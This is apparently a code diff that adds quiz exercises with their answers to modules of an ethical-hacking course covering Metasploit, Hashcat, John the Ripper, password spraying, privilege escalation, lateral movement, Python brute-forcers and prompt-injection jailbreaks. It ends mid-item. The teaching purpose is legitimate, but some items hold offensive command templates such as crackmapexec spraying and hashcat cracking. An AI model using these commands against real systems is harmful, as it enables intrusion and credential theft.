+            "explanation": "In a reverse shell the attacker listens first, then the target initiates the outbound connection back, handing the attacker control."
+          }
+        ],
         moduleId: "m11",
         number: 134,
         title:
@@ -20679,6 +25466,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each payload concept to its defining trait.",
+            "pairs": [
+              {
+                "left": "Staged payload",
+                "right": "Tiny stager fetches the rest over the network"
+              },
+              {
+                "left": "Non-staged payload",
+                "right": "Full payload delivered in one file, no follow-up"
+              },
+              {
+                "left": "Staged trade-off",
+                "right": "Needs an active connection for stage 2"
+              },
+              {
+                "left": "Non-staged trade-off",
+                "right": "Full code exposed to detection immediately"
+              }
+            ],
+            "explanation": "Staged payloads keep a small initial footprint but depend on a live stage-2 download, whereas non-staged payloads are self-contained but expose the full code at delivery."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the msfconsole module that catches either a staged or non-staged payload.",
+            "template": "In msfconsole, the module ___ catches either payload once payload/LHOST/LPORT are set.",
+            "blanks": [
+              "exploit/multi/handler"
+            ],
+            "explanation": "exploit/multi/handler receives the connection from either payload type as long as the payload, LHOST, and LPORT match what was generated.",
+            "distractors": [
+              "exploit/windows/handler",
+              "auxiliary/multi/handler"
+            ]
+          }
+        ],
         moduleId: "m11",
         number: 135,
         title: "Payload Types: Staged vs Non-Staged (Meterpreter, shell)",
@@ -20900,6 +25725,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the core Metasploit workflow from start to interaction.",
+            "items": [
+              "search for a module by CVE or name",
+              "use to select the module",
+              "set RHOSTS, LHOST, and payload",
+              "exploit to launch the attack",
+              "sessions -i to interact with the shell"
+            ],
+            "explanation": "Every Metasploit module follows the same search -> use -> set -> exploit flow, after which sessions lets the operator interact with the resulting shell."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each msfconsole command to what it does.",
+            "pairs": [
+              {
+                "left": "search",
+                "right": "Find a module by CVE, name, or platform"
+              },
+              {
+                "left": "use",
+                "right": "Select a module"
+              },
+              {
+                "left": "set",
+                "right": "Configure options like RHOSTS/LHOST"
+              },
+              {
+                "left": "exploit",
+                "right": "Launch the attack"
+              },
+              {
+                "left": "sessions -l",
+                "right": "List active sessions"
+              }
+            ],
+            "explanation": "These commands cover finding, selecting, configuring, launching, and managing the sessions that successful exploitation produces."
+          }
+        ],
         moduleId: "m11",
         number: 136,
         title:
@@ -21095,6 +25961,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-4",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the Hashcat mode to crack SHA2-256 hashes with a wordlist.",
+            "template": "hashcat -m ___ -a 0 hashes.txt rockyou.txt",
+            "blanks": [
+              "1400"
+            ],
+            "explanation": "Mode 1400 is SHA2-256 in Hashcat; mode 0 is MD5 and 100 is SHA1, so matching the hash type to the correct -m value is essential.",
+            "distractors": [
+              "0",
+              "100"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Hashcat flag to its meaning.",
+            "pairs": [
+              {
+                "left": "-m 0",
+                "right": "MD5 hash mode"
+              },
+              {
+                "left": "-m 1400",
+                "right": "SHA2-256 hash mode"
+              },
+              {
+                "left": "-a 0",
+                "right": "Straight wordlist attack"
+              },
+              {
+                "left": "--username",
+                "right": "Hash file includes usernames"
+              }
+            ],
+            "explanation": "-m selects the hash type, -a 0 runs a pure dictionary attack, and --username tells Hashcat to parse and skip the username column."
+          }
+        ],
         moduleId: "m11",
         number: 137,
         title: "Password Hash Cracking with Hashcat (modes, rules, wordlists)",
@@ -21273,6 +26177,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each John the Ripper invocation to its effect.",
+            "pairs": [
+              {
+                "left": "john (no options)",
+                "right": "Auto-detect format, use default wordlist"
+              },
+              {
+                "left": "--wordlist",
+                "right": "Point john at a specific wordlist"
+              },
+              {
+                "left": "--format=raw-SHA256",
+                "right": "Specify the hash algorithm explicitly"
+              },
+              {
+                "left": "--show",
+                "right": "Reveal already-cracked passwords"
+              }
+            ],
+            "explanation": "John auto-detects formats by default, but --wordlist, --format, and --show let you control the wordlist, resolve ambiguous formats, and recall prior results."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command to crack a raw SHA-256 hash with a chosen wordlist.",
+            "template": "john --wordlist=rockyou.txt --format=___ hashes.txt",
+            "blanks": [
+              "raw-SHA256"
+            ],
+            "explanation": "--format=raw-SHA256 explicitly tells John the hashes are raw SHA-256 when auto-detection would otherwise be ambiguous.",
+            "distractors": [
+              "raw-MD5",
+              "SHA256-raw"
+            ]
+          }
+        ],
         moduleId: "m11",
         number: 138,
         title: "Password Hash Cracking with John the Ripper",
@@ -21443,6 +26385,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each brute-force technique to its description.",
+            "pairs": [
+              {
+                "left": "Dictionary attack",
+                "right": "Tries real words and leaked passwords"
+              },
+              {
+                "left": "Reverse brute force",
+                "right": "One known password against many usernames"
+              },
+              {
+                "left": "Credential stuffing",
+                "right": "Replays leaked user:pass pairs on other sites"
+              },
+              {
+                "left": "Password spraying",
+                "right": "One common password across many accounts"
+              }
+            ],
+            "explanation": "These techniques differ in direction and source: dictionaries use likely words, reverse brute force and spraying vary the account, and stuffing exploits password reuse across sites."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the password-spraying example against an SMB subnet.",
+            "template": "crackmapexec smb 10.10.1.0/24 -u users.txt -p ___",
+            "blanks": [
+              "Welcome@123"
+            ],
+            "explanation": "Password spraying tries a single common password across many accounts, so one password value (Welcome@123) is paired with a list of users to avoid lockouts.",
+            "distractors": [
+              "rockyou.txt",
+              "admin1234"
+            ]
+          }
+        ],
         moduleId: "m11",
         number: 139,
         title:
@@ -21665,6 +26645,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-7",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command to locate root-owned SUID binaries.",
+            "template": "find / -perm -___ to find SUID binaries",
+            "blanks": [
+              "4000"
+            ],
+            "explanation": "The SUID bit is octal 4000, so find / -perm -4000 lists binaries that run with their owner's (often root's) privileges.",
+            "distractors": [
+              "2000",
+              "0400"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Linux privesc concept to its description.",
+            "pairs": [
+              {
+                "left": "sudo -l",
+                "right": "Show commands runnable as root"
+              },
+              {
+                "left": "SUID binary",
+                "right": "Runs as root regardless of the caller"
+              },
+              {
+                "left": "GTFOBins",
+                "right": "Catalogue of abusable Unix binaries"
+              },
+              {
+                "left": "Writable cron script",
+                "right": "Inject commands into a scheduled root run"
+              },
+              {
+                "left": "Dirty COW",
+                "right": "Kernel copy-on-write race exploit"
+              }
+            ],
+            "explanation": "Linux privesc hunts for misconfigurations and kernel flaws - permissive sudo rules, SUID binaries, writable cron jobs, or a kernel race like Dirty COW - that let a low-privilege user act as root."
+          }
+        ],
         moduleId: "m11",
         number: 140,
         title:
@@ -21888,6 +26910,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Windows privilege-escalation technique to its description.",
+            "pairs": [
+              {
+                "left": "AlwaysInstallElevated",
+                "right": "Install an MSI with SYSTEM privileges"
+              },
+              {
+                "left": "Unquoted service path",
+                "right": "Plant an exe earlier in a spaced path"
+              },
+              {
+                "left": "Token impersonation",
+                "right": "Abuse SeImpersonatePrivilege (Potato)"
+              },
+              {
+                "left": "Mimikatz",
+                "right": "Extract cached credentials and hashes"
+              }
+            ],
+            "explanation": "Windows privesc abuses installer policy, service misconfigurations, and token handling to reach SYSTEM, while Mimikatz harvests the credential material involved."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the escalation type that climbs from a standard user to admin.",
+            "template": "___ privilege escalation climbs from a standard user to SYSTEM/admin.",
+            "blanks": [
+              "Vertical"
+            ],
+            "explanation": "Vertical escalation raises the privilege level (user to admin/root), whereas horizontal escalation stays at the same level but reaches another user's resources.",
+            "distractors": [
+              "Horizontal",
+              "Lateral"
+            ]
+          }
+        ],
         moduleId: "m11",
         number: 141,
         title:
@@ -22098,6 +27158,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the stages of a compromise after the first host is taken.",
+            "items": [
+              "Pivot to other hosts via Pass-the-Hash",
+              "Establish persistence (scheduled tasks/cron)",
+              "Exfiltrate data (scp, DNS tunneling)",
+              "Clear tracks (log cleansing, shred)"
+            ],
+            "explanation": "The later compromise arc runs from lateral movement to maintaining a foothold, then exfiltrating data, and finally covering tracks for a clean exit."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each lateral-movement concept to its description.",
+            "pairs": [
+              {
+                "left": "Pass-the-Hash",
+                "right": "Authenticate with a stolen NTLM hash"
+              },
+              {
+                "left": "ARP spoofing",
+                "right": "Forge ARP replies to redirect traffic"
+              },
+              {
+                "left": "Pivoting",
+                "right": "Route traffic through a compromised host"
+              },
+              {
+                "left": "DNS tunneling",
+                "right": "Exfiltrate data via a legitimate-looking protocol"
+              }
+            ],
+            "explanation": "Lateral movement reuses stolen hashes and compromised hosts to reach new segments, while ARP spoofing intercepts LAN traffic and DNS tunneling smuggles data out."
+          }
+        ],
         moduleId: "m11",
         number: 142,
         title: "Lateral Movement & Pivoting Basics (Pass-the-Hash, SMB, RDP)",
@@ -22308,6 +27404,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-10",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the per-machine methodology for a beginner box.",
+            "items": [
+              "Recon with Nmap",
+              "Identify a vulnerable service/version",
+              "Exploit to gain a shell",
+              "Escalate privileges to root/admin",
+              "Capture the flag"
+            ],
+            "explanation": "Each write-up follows the same chain: recon, find a vulnerable service, exploit for a shell, escalate, and capture the flag."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each write-up element to what it covers.",
+            "pairs": [
+              {
+                "left": "Stage 1: Gaining Access",
+                "right": "Recon finds a service, exploit gives a shell"
+              },
+              {
+                "left": "Stage 2: Privilege Escalation",
+                "right": "Abuse a misconfig to reach root/admin"
+              },
+              {
+                "left": "Write-up format",
+                "right": "Overview, recon, exploit, privesc, flag"
+              },
+              {
+                "left": "Post-flag (real attacker)",
+                "right": "Data exfiltration and clearing tracks"
+              }
+            ],
+            "explanation": "Each box is framed as the staged attack chain - gaining access then escalating - documented in a consistent write-up format, noting what a real attacker would do beyond the flag."
+          }
+        ],
         moduleId: "m11",
         number: 143,
         title: "VulnMachines: 5 Beginner Machines (write up each)",
@@ -22457,6 +27590,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m11-11",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each hash length or flag to its correct meaning for the lab.",
+            "pairs": [
+              {
+                "left": "32 hex characters",
+                "right": "MD5 - mode 0"
+              },
+              {
+                "left": "64 hex characters",
+                "right": "SHA2-256 - mode 1400"
+              },
+              {
+                "left": "--username flag",
+                "right": "Parse usernames alongside hashes"
+              },
+              {
+                "left": "rockyou.txt",
+                "right": "Standard wordlist for the run"
+              }
+            ],
+            "explanation": "Hash length identifies the type and its Hashcat mode (32 hex = MD5 mode 0, 64 hex = SHA2-256 mode 1400), while --username and rockyou.txt handle parsing and the wordlist."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the command to crack an MD5 list that includes usernames.",
+            "template": "hashcat -m 0 -a 0 --username hashes.txt ___",
+            "blanks": [
+              "rockyou.txt"
+            ],
+            "explanation": "The wordlist (rockyou.txt) is the final positional argument; -m 0 sets MD5 and --username skips the username column during parsing.",
+            "distractors": [
+              "--show",
+              "-m 1400"
+            ]
+          }
+        ],
         moduleId: "m11",
         number: 144,
         title: "Lab: Crack a provided hash list with Hashcat using rockyou.txt",
@@ -22608,6 +27779,48 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m12-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each security-relevant Python library to what it is used for in this module.",
+            "pairs": [
+              {
+                "left": "socket",
+                "right": "Network programming / port scanning"
+              },
+              {
+                "left": "requests",
+                "right": "Sending HTTP web requests"
+              },
+              {
+                "left": "hashlib",
+                "right": "Cryptographic hashing"
+              },
+              {
+                "left": "scapy",
+                "right": "Packet manipulation"
+              },
+              {
+                "left": "base64",
+                "right": "Encoding / decoding data"
+              }
+            ],
+            "explanation": "Each library turns general-purpose Python into a security toolkit for a specific job: socket for raw networking, requests for HTTP, hashlib for hashing, scapy for packets, and base64 for encoding."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the context manager used for safe file handling.",
+            "template": "with ___('scan.txt', 'w') as f:",
+            "blanks": [
+              "open"
+            ],
+            "explanation": "The with open(...) context manager guarantees the file handle is closed even if an error occurs partway through, and 'w' opens the file in write mode.",
+            "distractors": [
+              "file",
+              "read"
+            ]
+          }
+        ],
         moduleId: "m12",
         number: 145,
         title:
@@ -23023,6 +28236,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-2",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the call that opens a TCP socket.",
+            "template": "s = socket.socket(socket.AF_INET, socket.___)",
+            "blanks": [
+              "SOCK_STREAM"
+            ],
+            "explanation": "SOCK_STREAM with AF_INET creates a TCP socket, the basis of a connect-based port scanner; SOCK_DGRAM would create a UDP socket instead.",
+            "distractors": [
+              "SOCK_DGRAM",
+              "SOCK_RAW"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each socket/requests feature to its purpose.",
+            "pairs": [
+              {
+                "left": "connect_ex()",
+                "right": "Attempt a connection without raising on failure"
+              },
+              {
+                "left": "requests.get()",
+                "right": "Send an HTTP GET request"
+              },
+              {
+                "left": ".status_code",
+                "right": "Read the HTTP response code"
+              },
+              {
+                "left": "timeout",
+                "right": "Stop an unresponsive host from hanging the script"
+              },
+              {
+                "left": "BeautifulSoup",
+                "right": "Parse the HTML of a response body"
+              }
+            ],
+            "explanation": "connect_ex() returns an error code instead of raising, requests exposes .status_code/.content, a timeout prevents indefinite hangs, and BeautifulSoup structures scraped HTML."
+          }
+        ],
         moduleId: "m12",
         number: 146,
         title: "Working with Sockets & Requests in Python",
@@ -23187,6 +28442,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the MAC address changer's steps in the correct order.",
+            "items": [
+              "Validate the new MAC against the regex",
+              "Bring the interface down (ip link set down)",
+              "Set the new MAC address",
+              "Bring the interface back up",
+              "Re-read the interface and confirm the MAC changed"
+            ],
+            "explanation": "validate_mac() checks the format before touching the interface, change_mac() runs down/set/up in sequence, and the script re-reads the live MAC rather than trusting the exit code alone."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the real command-line invocation of the script.",
+            "template": "sudo python3 mac_changer.py ___ eth0 ___ 00:11:22:33:44:55",
+            "blanks": [
+              "-i",
+              "-m"
+            ],
+            "explanation": "argparse defines -i/--interface for the interface and -m/--mac for the new address, and sudo is required because changing a hardware address needs root.",
+            "distractors": [
+              "-a"
+            ]
+          }
+        ],
         moduleId: "m12",
         number: 147,
         title: "Python: MAC Address Changer Script",
@@ -23387,6 +28669,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-4",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the open-port check in the TCP connect scanner.",
+            "template": "if sock.___((ip, port)) == 0:",
+            "blanks": [
+              "connect_ex"
+            ],
+            "explanation": "connect_ex() returns 0 when the connection succeeds (port open) and a non-zero code otherwise, without raising an exception on failure.",
+            "distractors": [
+              "connect",
+              "bind"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each port-scanner concept to its meaning.",
+            "pairs": [
+              {
+                "left": "connect_ex() returns 0",
+                "right": "Port is open"
+              },
+              {
+                "left": "connect_ex() returns non-zero",
+                "right": "Port is closed or filtered"
+              },
+              {
+                "left": "Nmap -sT",
+                "right": "TCP connect scan technique"
+              },
+              {
+                "left": "Short socket timeout",
+                "right": "Avoid hanging on each port"
+              }
+            ],
+            "explanation": "A connect scan is exactly what Nmap's -sT performs: a return of 0 means open, anything else means closed/filtered, and a short timeout keeps long scans responsive."
+          }
+        ],
         moduleId: "m12",
         number: 148,
         title: "Python: Port Scanner Script (TCP connect scan)",
@@ -23542,6 +28862,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of the subdomain brute-forcer.",
+            "items": [
+              "Load a wordlist of subdomain prefixes",
+              "Build http://{sub}.{domain} for each entry",
+              "Send a requests.get() with a short timeout",
+              "Catch requests.ConnectionError for dead subdomains",
+              "Print live 200-responding subdomains as [+] Found"
+            ],
+            "explanation": "The enumerator loops the wordlist, builds a URL per prefix, fires a timed request, skips non-existent hosts via try/except, and reports the resolvable subdomains."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about detecting a live subdomain.",
+            "template": "A ___ status code indicates a live, resolvable subdomain.",
+            "blanks": [
+              "200"
+            ],
+            "explanation": "A 200 response (with a short timeout) means the subdomain is reachable; non-existent subdomains instead raise requests.ConnectionError and are skipped.",
+            "distractors": [
+              "404",
+              "301"
+            ]
+          }
+        ],
         moduleId: "m12",
         number: 149,
         title: "Python: Subdomain Brute-Forcer Script",
@@ -23729,6 +29076,47 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-6",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the login brute-forcer's logic as in weblogin-bruteforce.py.",
+            "items": [
+              "Loop each username in the username list",
+              "Open the password wordlist file for that username",
+              "Send requests.post() with the username/password form data",
+              "Check if the success needle is in r.content",
+              "On a match, print the valid pair and call sys.exit()"
+            ],
+            "explanation": "The script treats usernames as an outer loop, re-reads the wordlist per username, POSTs each credential pair, and stops immediately once the success string appears in the response bytes."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each brute-force element to its role.",
+            "pairs": [
+              {
+                "left": "weblogin-bruteforce.py",
+                "right": "HTTP login form brute-force"
+              },
+              {
+                "left": "SSH_bruteforce.py",
+                "right": "SSH brute-force via pwntools"
+              },
+              {
+                "left": "paramiko AuthenticationException",
+                "right": "Signals a failed SSH login"
+              },
+              {
+                "left": "needle.encode() in r.content",
+                "right": "Detects a successful login"
+              },
+              {
+                "left": "sys.stdout.write with \\r",
+                "right": "Overwrites the progress line in place"
+              }
+            ],
+            "explanation": "The same wordlist-loop skeleton applies to HTTP and SSH; success is detected by searching the response bytes for a needle, while \\r keeps live progress on one line."
+          }
+        ],
         moduleId: "m12",
         number: 150,
         title: "Python: Application Login Brute-Forcer Script",
@@ -24129,6 +29517,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m12-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the safe workflow for using AI to write a security script.",
+            "items": [
+              "Ask the AI to scaffold the script's structure",
+              "Read and understand every generated line",
+              "Test the script in an isolated lab environment",
+              "Only then rely on it operationally"
+            ],
+            "explanation": "AI speeds up scaffolding, but every line must be understood and validated in an isolated lab before the script is trusted against real targets."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the privacy rule for using public AI tools.",
+            "template": "Never paste real ___, internal hostnames, or client data into a public AI tool.",
+            "blanks": [
+              "credentials"
+            ],
+            "explanation": "Real credentials, internal hostnames, and client data must never go into a public AI prompt, since that content can be exposed outside your control.",
+            "distractors": [
+              "comments",
+              "variables"
+            ]
+          }
+        ],
         moduleId: "m12",
         number: 151,
         title:
@@ -24265,6 +29679,41 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m13-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each machine-learning flavour to its example use case.",
+            "pairs": [
+              {
+                "left": "Supervised learning",
+                "right": "Spam vs. not-spam classification"
+              },
+              {
+                "left": "Unsupervised learning",
+                "right": "Grouping similar customers into clusters"
+              },
+              {
+                "left": "Reinforcement learning",
+                "right": "A self-learning bot improving via reward feedback"
+              }
+            ],
+            "explanation": "Supervised learns from labelled data, unsupervised finds hidden patterns without labels, and reinforcement learns through reward/penalty feedback."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the nesting relationship of the three layers.",
+            "template": "Deep Learning is a subset of ___, which is itself a subset of ___.",
+            "blanks": [
+              "ML",
+              "AI"
+            ],
+            "explanation": "AI is the broad goal, ML is a subset that learns from data, and DL is a further subset using deeply layered neural networks.",
+            "distractors": [
+              "DL",
+              "GPU"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 152,
         title: "Basics of AI, ML, and Deep Learning in Security Context",
@@ -24430,6 +29879,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each AI security technique to what it does.",
+            "pairs": [
+              {
+                "left": "PassGAN",
+                "right": "AI-assisted password prediction/cracking"
+              },
+              {
+                "left": "AI voice cloning",
+                "right": "Impersonating a CEO to authorise a wire transfer"
+              },
+              {
+                "left": "AI-powered honeypots",
+                "right": "Realistic decoy systems that lure attackers"
+              },
+              {
+                "left": "Anomaly detection (ML + SIEM)",
+                "right": "Flagging a login from a new country"
+              }
+            ],
+            "explanation": "The first two are offensive uses, the last two defensive — the same pattern-recognition techniques cut both ways."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the real-world incident figures.",
+            "template": "A real case: a company lost $___ after attackers used AI ___ cloning to impersonate a CEO and trick employees into wiring funds.",
+            "blanks": [
+              "243,000",
+              "voice"
+            ],
+            "explanation": "The $243,000 AI voice-cloning fraud shows the offensive side of dual-use AI is not theoretical.",
+            "distractors": [
+              "243",
+              "video"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 153,
         title: "Role of AI in Offensive & Defensive Cybersecurity",
@@ -24589,6 +30077,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-3",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each core ethical concern to its description.",
+            "pairs": [
+              {
+                "left": "Privacy violations",
+                "right": "Collecting PII without authorisation"
+              },
+              {
+                "left": "Lack of accountability",
+                "right": "Hard to assign responsibility for AI-caused harm"
+              },
+              {
+                "left": "Bias and discrimination",
+                "right": "Unfairness baked into training data"
+              },
+              {
+                "left": "Weaponisation",
+                "right": "Turning AI capability into cyber weapons"
+              }
+            ],
+            "explanation": "These are the four core ethical concerns of AI-assisted hacking; bias, for example, can wrongly flag legitimate users as fraudulent."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the legal-compliance facts.",
+            "template": "Under the EU's ___, data-protection fines can reach ___ million euros, while CCPA governs consumer data in California.",
+            "blanks": [
+              "GDPR",
+              "20"
+            ],
+            "explanation": "Following applicable laws like GDPR (fines up to 20 million euros) is a core ethical-use principle — 'it's just AI-generated' is not a legal defence.",
+            "distractors": [
+              "CCPA",
+              "10"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 154,
         title: "Ethical Boundaries in AI-Assisted Hacking",
@@ -24748,6 +30275,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the DeepSeek-via-Ollama setup steps in the correct order.",
+            "items": [
+              "Confirm system requirements (min 16GB RAM, 20-50GB storage)",
+              "Download Ollama from ollama.com/download for your OS",
+              "Run the model from a terminal to download and start DeepSeek locally",
+              "Install the 'Continue' extension in VS Code for in-editor AI"
+            ],
+            "explanation": "A single terminal command both downloads and starts the model; Continue then auto-detects the locally running Ollama model."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each system requirement to its stated value.",
+            "pairs": [
+              {
+                "left": "Minimum RAM",
+                "right": "16GB"
+              },
+              {
+                "left": "Recommended RAM",
+                "right": "32GB"
+              },
+              {
+                "left": "Free storage needed",
+                "right": "20-50GB"
+              },
+              {
+                "left": "Optional accelerator",
+                "right": "NVIDIA CUDA-supported GPU"
+              }
+            ],
+            "explanation": "Running local (Edge) AI trades hardware and disk space for privacy — nothing leaves the machine, so it suits sensitive engagement data."
+          }
+        ],
         moduleId: "m13",
         number: 155,
         title: "Installing & Using Local AI (DeepSeek locally)",
@@ -24963,6 +30526,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each OSINT tool to its purpose.",
+            "pairs": [
+              {
+                "left": "Maltego",
+                "right": "Graph-based link analysis"
+              },
+              {
+                "left": "Shodan",
+                "right": "Search engine for internet-connected devices"
+              },
+              {
+                "left": "Google Dorking",
+                "right": "Advanced search operators for exposed data"
+              },
+              {
+                "left": "Have I Been Pwned",
+                "right": "Checking for leaked credentials"
+              }
+            ],
+            "explanation": "These tools automate collection and analysis of publicly available information to map an organisation's exposed attack surface."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of OSINT and NLP-driven analysis.",
+            "template": "___ is the process of collecting and analysing publicly available information; NLP models like GPT-4 or ___ can summarise scraped reports into a structured intelligence report.",
+            "blanks": [
+              "OSINT",
+              "BERT"
+            ],
+            "explanation": "OSINT turns public data into intelligence; large language models such as GPT-4 or BERT summarise and theme raw scraped text at scale.",
+            "distractors": [
+              "Shodan",
+              "GPT-2"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 156,
         title: "AI-Powered Reconnaissance & OSINT Automation",
@@ -25107,6 +30709,49 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each phishing type to its defining trait.",
+            "pairs": [
+              {
+                "left": "Vishing",
+                "right": "Phone calls"
+              },
+              {
+                "left": "Smishing",
+                "right": "SMS with malicious links"
+              },
+              {
+                "left": "Whaling",
+                "right": "Targets executives like CEOs/CFOs"
+              },
+              {
+                "left": "Clone phishing",
+                "right": "A real email copied with links/attachments swapped"
+              },
+              {
+                "left": "Spear phishing",
+                "right": "Personalised attack using specific target details"
+              }
+            ],
+            "explanation": "Knowing the taxonomy helps classify an attack by its channel and how targeted it is."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete what AI changed about phishing emails.",
+            "template": "Before AI, phishing emails were often full of ___ mistakes — an easy tell; AI now produces fluent, ___ scam text that removes those red flags.",
+            "blanks": [
+              "spelling",
+              "personalised"
+            ],
+            "explanation": "AI removes the old typo-based tells, so awareness training must focus on manipulation techniques (urgency, authority, fear) rather than grammar.",
+            "distractors": [
+              "encryption",
+              "random"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 157,
         title: "AI for Phishing & Social Engineering (awareness exercise)",
@@ -25272,6 +30917,41 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each prompt-injection technique to its description.",
+            "pairs": [
+              {
+                "left": "Direct prompt injection",
+                "right": "The attacker's prompt itself overrides the model's guardrails"
+              },
+              {
+                "left": "Indirect prompt injection",
+                "right": "Hidden instructions embedded in a webpage or document the LLM summarises"
+              },
+              {
+                "left": "Jailbreaking",
+                "right": "Exploiting the model specifically to bypass safety guardrails"
+              }
+            ],
+            "explanation": "Direct injection uses the prompt itself, indirect hides instructions in analysed content, and jailbreaking targets the model's safety limits."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the key prompt-injection defences.",
+            "template": "Key defences: strict input ___ to reject manipulative prompts, and ___ isolation that keeps user input separate from system-level instructions.",
+            "blanks": [
+              "validation",
+              "context"
+            ],
+            "explanation": "Input validation/filtering and context isolation, plus ongoing monitoring and user education, defend against prompt injection.",
+            "distractors": [
+              "encryption",
+              "output"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 158,
         title: "Bypassing AI Ethical Limits via Prompt Injection",
@@ -25448,6 +31128,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each AI code-review tool to what it does.",
+            "pairs": [
+              {
+                "left": "GitHub Copilot",
+                "right": "Inline suggestions and warnings about bad practices"
+              },
+              {
+                "left": "CodeQL",
+                "right": "Static analysis matching code against known vuln patterns"
+              },
+              {
+                "left": "Semgrep",
+                "right": "Lightweight, customisable rule-based scanning"
+              },
+              {
+                "left": "ChatGPT / LLMs",
+                "right": "Conversationally explain and review code"
+              }
+            ],
+            "explanation": "Each tool flags common vulnerability patterns, but a human still confirms the fix is correct for the context."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete how AI finds vulnerabilities and its limitation.",
+            "template": "AI learns to flag risky patterns from large sets of ___ and insecure code, but each flagged issue still needs a ___ to confirm the fix is correct.",
+            "blanks": [
+              "secure",
+              "human"
+            ],
+            "explanation": "Models train on secure vs. insecure code to recognise risky patterns; AI is a second pair of eyes, not a replacement for understanding the code.",
+            "distractors": [
+              "compiled",
+              "machine"
+            ]
+          }
+        ],
         moduleId: "m13",
         number: 159,
         title:
@@ -25579,6 +31298,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m13-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the AI-assisted subdomain enumeration lab workflow.",
+            "items": [
+              "Take a domain and iterate over common subdomain prefixes (www, mail, admin)",
+              "Send an HTTP GET to each sub.domain with a short timeout",
+              "Ask the AI to add concurrency/threading and graceful error handling",
